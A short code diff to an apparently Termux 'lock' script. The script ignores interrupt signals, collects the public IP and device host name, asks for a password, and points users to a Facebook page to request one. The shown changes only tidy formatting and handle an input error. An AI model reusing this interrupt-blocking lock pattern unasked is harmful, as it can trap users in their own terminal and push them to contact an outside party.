@@ -1,7 +1,7 @@
 import os ,sys ,signal,subprocess,readline
       
-signal.signal(signal.SIGTSTP, signal.SIG_IGN)
-signal.signal(signal.SIGINT, signal.SIG_IGN)
+signal.signal(signal.SIGTSTP,signal.SIG_IGN)
+signal.signal(signal.SIGINT,signal.SIG_IGN)
  
 red="\033[1;31m"
 grn="\033[1;32m"
@@ -10,7 +10,7 @@ blue="\033[1;34m"
 prple="\033[1;35m"
 cyan="\033[1;36m"
 res="\033[0m"
-
+ps=''
 IP=subprocess.run("curl ifconfig.me", capture_output=True,shell=True).stdout.decode('ascii')
 dev=subprocess.run("neofetch |grep Host|cut -d ':' -f 2-10 ", capture_output=True,shell=True).stdout.decode('ascii')
 
@@ -52,7 +52,11 @@ while 1:
 	
 	elif test=='b':
 		print("")
-		ps=input(f"{yel} Input Password : {grn}")
+		try:
+			ps=input(f"{yel} Input Password : {grn}")
+		except EOFError:
+			pass
+		
 		print("")
 		print(f"{yel}copy the link{grn} or{yel} input letter 'a'{grn} to request password {cyan}")
 		print(f"https://m.facebook.com/Termux-Lock-103516795184086/{res}")
